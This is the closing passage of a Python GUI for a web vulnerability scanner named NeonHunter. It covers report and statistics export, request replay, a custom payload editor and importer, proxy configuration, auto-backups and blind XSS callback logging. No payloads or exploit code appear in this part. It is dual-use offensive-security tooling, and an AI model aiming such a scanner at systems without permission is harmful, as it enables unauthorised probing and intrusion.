        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2)
    
    def export_statistics(self):
        """Export statistics to file"""
        if not self.results:
            messagebox.showwarning("No Data", "No scan data available")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            stats_text = f"""
NEONHUNTER STATISTICS REPORT
============================

Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: {self.target_entry.get()}

📊 PERFORMANCE STATS:
• Total Requests: {self.stats['requests_sent']}
• Successful Requests: {self.stats['requests_success']}
• Errors: {self.stats['errors']}
• Scan Duration: {self.stats.get('scan_duration', 'N/A')}
• Payloads/Sec: {self.stats.get('payloads_per_second', 0):.1f}

🔍 VULNERABILITY STATS:
• Total Findings: {len(self.results)}
• Critical: {self.stats['critical_findings']}
• High: {self.stats['high_findings']}
• Medium: {self.stats['medium_findings']}
• Low: {self.stats['low_findings']}

📋 VULNERABILITY BREAKDOWN:
"""
            
            vuln_counts = {}
            for vuln in self.results:
                vuln_type = vuln['vuln_type']
                vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
            
            for vuln_type, count in vuln_counts.items():
                stats_text += f"• {vuln_type}: {count}\n"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(stats_text)
            
            self.log(f"📈 Statistics exported to {filename}")
    
    def show_statistics(self):
        """Show statistics dialog"""
        if not self.results and self.stats['requests_sent'] == 0:
            messagebox.showinfo("Statistics", "No scan data available yet")
            return
        
        stats_text = f"""
📊 NEONHUNTER STATISTICS
========================

🎯 Target: {self.target_entry.get() or 'Not set'}

⚡ PERFORMANCE:
• Total Requests: {self.stats['requests_sent']}
• Successful: {self.stats['requests_success']}
• Errors: {self.stats['errors']}
• Scan Duration: {self.stats.get('scan_duration', 'N/A')}
• Speed: {self.stats.get('payloads_per_second', 0):.1f}/s

🔍 FINDINGS:
• Total Vulnerabilities: {len(self.results)}
• Critical: {self.stats['critical_findings']}
• High: {self.stats['high_findings']}
• Medium: {self.stats['medium_findings']}
• Low: {self.stats['low_findings']}

📈 SUCCESS RATE: 
"""
        
        if self.stats['requests_sent'] > 0:
            success_rate = ((self.stats['requests_sent'] - self.stats['errors']) / 
                           self.stats['requests_sent'] * 100)
            stats_text += f"• {success_rate:.1f}% successful requests\n"
        
        messagebox.showinfo("Statistics", stats_text)
    
    def replay_request(self):
        """Replay the last request"""
        if not self.results:
            messagebox.showwarning("No Requests", "No requests to replay")
            return
        
        # Get the last request URL
        last_vuln = self.results[-1]
        url = last_vuln['url']
        
        try:
            session = self.get_session()
            response = session.get(url, timeout=10)
            
            # Show response in new window
            window = tk.Toplevel(self.root)
            window.title(f"Replay: {url[:50]}...")
            window.geometry("800x600")
            
            text = scrolledtext.ScrolledText(window, wrap='word')
            text.pack(fill='both', expand=True)
            
            text.insert('1.0', f"URL: {url}\n")
            text.insert('2.0', f"Status: {response.status_code}\n")
            text.insert('3.0', f"Headers:\n{response.headers}\n")
            text.insert('4.0', f"\nResponse Body:\n{response.text[:5000]}")
            
            self.log(f"↩️ Replayed request to {url[:50]}...")
        except Exception as e:
            messagebox.showerror("Replay Error", f"Failed to replay request:\n{e}")
    
    def manage_sessions(self):
        """Manage HTTP sessions"""
        messagebox.showinfo("Session Manager", 
                          "Session management feature will be implemented in future version.")
    
    def customize_payloads(self):
        """Customize payloads"""
        window = tk.Toplevel(self.root)
        window.title("Custom Payloads Editor")
        window.geometry("600x400")
        
        text = scrolledtext.ScrolledText(window, wrap='word')
        text.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Load existing custom payloads
        if self.custom_payloads:
            for vuln_type, payloads in self.custom_payloads.items():
                text.insert('end', f"# {vuln_type}\n")
                for payload in payloads:
                    text.insert('end', f"{payload}\n")
                text.insert('end', "\n")
        
        def save_payloads():
            content = text.get('1.0', tk.END)
            # Parse and save custom payloads
            self.log("💾 Custom payloads saved")
            window.destroy()
        
        tk.Button(window, text="Save", command=save_payloads).pack(pady=10)
    
    def import_custom_payloads(self):
        """Import custom payloads from file"""
        filepath = filedialog.askopenfilename(
            title="Import Payloads",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filepath:
            try:
                with open(filepath, 'r') as f:
                    content = f.read()
                
                # Parse payloads
                lines = content.split('\n')
                vuln_type = None
                current_payloads = []
                
                for line in lines:
                    line = line.strip()
                    if line.startswith('#'):
                        if vuln_type and current_payloads:
                            self.custom_payloads[vuln_type] = current_payloads
                        vuln_type = line[1:].strip()
                        current_payloads = []
                    elif line and not line.startswith('//'):
                        current_payloads.append(line)
                
                if vuln_type and current_payloads:
                    self.custom_payloads[vuln_type] = current_payloads
                
                self.log(f"📥 Custom payloads imported from {os.path.basename(filepath)}")
                messagebox.showinfo("Import Successful", "Custom payloads imported successfully!")
            except Exception as e:
                messagebox.showerror("Import Error", f"Failed to import payloads:\n{e}")
    
    def play_alert_sound(self):
        """Play alert sound for critical findings"""
        try:
            for i in range(3):
                winsound.Beep(1000, 200)
                time.sleep(0.1)
        except:
            pass
    
    def load_config(self):
        """Load configuration"""
        config_file = "neonhunter_config.json"
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                
                if 'target' in config:
                    self.target_entry.delete(0, tk.END)
                    self.target_entry.insert(0, config['target'])
                
                if 'proxy' in config:
                    self.proxy_entry.delete(0, tk.END)
                    self.proxy_entry.insert(0, config['proxy'])
                
                if 'delay' in config:
                    self.delay_var.set(config['delay'])
                
                if 'concurrent' in config:
                    self.concurrent_requests.set(config['concurrent'])
                
                if 'timeout' in config:
                    self.timeout_var.set(config['timeout'])
                
                if 'vulns' in config:
                    for vuln, enabled in config['vulns'].items():
                        if vuln in self.vulns:
                            self.vulns[vuln].set(enabled)
                
                self.log("📥 Configuration loaded")
            except Exception as e:
                self.log(f"❌ Config load error: {e}")
    
    def save_config(self):
        """Save configuration"""
        config = {
            'target': self.target_entry.get(),
            'proxy': self.proxy_entry.get(),
            'delay': self.delay_var.get(),
            'concurrent': self.concurrent_requests.get(),
            'timeout': self.timeout_var.get(),
            'vulns': {name: var.get() for name, var in self.vulns.items()},
            'payloads': {name: payloads[:10] for name, payloads in self.payloads.items()}
        }
        
        with open("neonhunter_config.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        self.log("💾 Configuration saved")
    
    def auto_save_worker(self):
        """Auto-save worker thread"""
        while True:
            time.sleep(60)  # Auto-save every minute
            if self.is_running and self.auto_save_var.get():
                self.save_auto_backup()
    
    def save_auto_backup(self):
        """Save auto-backup"""
        try:
            backup_dir = "backups"
            os.makedirs(backup_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"{backup_dir}/neonhunter_backup_{timestamp}.json"
            
            backup_data = {
                'timestamp': timestamp,
                'target': self.target_entry.get(),
                'results': self.results,
                'stats': self.stats
            }
            
            with open(backup_file, 'w') as f:
                json.dump(backup_data, f, indent=2)
            
            # Keep only last 10 backups
            backups = sorted([f for f in os.listdir(backup_dir) if f.startswith('neonhunter_backup_')])
            if len(backups) > 10:
                for old_backup in backups[:-10]:
                    os.remove(os.path.join(backup_dir, old_backup))
            
            self.log(f"💾 Auto-backup saved: {backup_file}")
        except Exception as e:
            self.log(f"❌ Auto-backup failed: {e}")
    
    def save_blind_xss_log(self, log_data):
        """Save blind XSS log"""
        try:
            log_dir = "blind_xss_logs"
            os.makedirs(log_dir, exist_ok=True)
            
            log_file = f"{log_dir}/blind_xss_{datetime.now().strftime('%Y%m%d')}.json"
            
            logs = []
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    logs = json.load(f)
            
            logs.append(log_data)
            
            with open(log_file, 'w') as f:
                json.dump(logs, f, indent=2)
            
        except Exception as e:
            self.log(f"❌ Failed to save blind XSS log: {e}")
    
    def zoom_text(self, factor):
        """Zoom text in/out"""
        current_font = self.log_text['font']
        font_parts = current_font.split()
        if len(font_parts) >= 2:
            try:
                size = int(font_parts[1])
                new_size = max(8, min(24, int(size * factor)))
                self.log_text.config(font=(font_parts[0], new_size))
                self.log(f"🔍 Text zoom: {new_size}pt")
            except:
                pass
    
    def on_closing(self):
        """Handle application closing"""
        if messagebox.askyesno("Exit", "Are you sure you want to exit NeonHunter?"):
            self.save_config()
            
            if hasattr(self, 'blind_server') and self.blind_server:
                self.blind_server.shutdown()
            
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    try:
        app = AdvancedNeonHunter(root)
        root.protocol("WM_DELETE_WINDOW", app.on_closing)
        root.mainloop()
    except Exception as e:
        print(f"❌ Error starting application: {e}")
        import traceback
        traceback.print_exc()